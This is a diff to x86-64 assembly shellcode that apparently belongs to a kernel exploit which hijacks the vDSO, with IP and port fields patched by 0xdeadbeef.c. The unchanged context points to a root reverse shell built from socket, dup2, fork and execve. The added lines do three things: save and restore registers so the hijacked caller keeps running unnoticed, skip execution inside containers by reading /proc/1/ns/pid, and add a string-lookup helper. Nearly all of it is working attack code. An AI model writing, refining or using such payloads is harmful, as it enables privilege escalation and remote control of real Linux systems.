@@ -9,6 +9,7 @@ SYS_DUP2	equ 0x21
 SYS_FORK	equ 0x39
 SYS_EXECVE	equ 0x3b
 SYS_EXIT	equ 0x3c
+SYS_READLINK	equ 0x59
 SYS_GETUID	equ 0x66
 
 AF_INET		equ 0x2
@@ -18,6 +19,12 @@ IP		equ 0xdeadc0de	;; patched by 0xdeadbeef.c
 PORT		equ 0x1337	;; patched by 0xdeadbeef.c
 
 _start:
+		;; save registers
+		push	rdi
+		push	rsi
+		push	rdx
+		push	rcx
+
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 		;;
 		;; return if getuid() != 0
@@ -31,12 +38,29 @@ _start:
 
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 		;;
+		;; check if whithin a container (PROC_PID_INIT_INO = 0xEFFFFFFC)
+		;; return if $(readlink /proc/1/ns/pid) != "pid:[4026531836]"
+		;;
+		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+
+		call	get_strings
+		lea	rsi, [rsp-16]
+		mov	rdx, 16			; strlen("pid:[4026531836]")
+		mov	rax, SYS_READLINK
+		syscall
+		cmp	rax, rdx
+		jne	return
+		add	rdi, 15			; "pid:[4026531836]"
+		mov	rcx, rdx
+		repe cmpsb
+		jne	return
+
+		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+		;;
 		;; return if open("/tmp/.x", O_CREAT|O_EXCL, x) == -1
 		;;
 		;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-		push    rdi
-		push    rsi
 		mov     rsi, 0x00782e2f706d742f
 		push    rsi
 		mov     rdi, rsp
@@ -45,8 +69,6 @@ _start:
 		syscall
 		test    rax, rax
 		pop     rsi
-		pop     rsi
-		pop     rdi
 		js      return
 
 		;; fork
@@ -123,9 +145,21 @@ exit:
 		syscall
 
 return:
+		;; restore registers
+		pop	rcx
+		pop     rdx
+		pop     rsi
+		pop     rdi
 		;; get callee address (pushed on the stack by the call instruction)
 		pop     rax
 		;; execute missed instructions (patched by 0xdeadbeef.c)
 		db	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
 		;; return to callee
 		jmp     rax
+
+get_strings:
+               lea	rdi, [rel $ +8]
+               ret
+               db	'/proc/1/ns/pid'
+               db	0
+               db	'pid:[4026531836]'
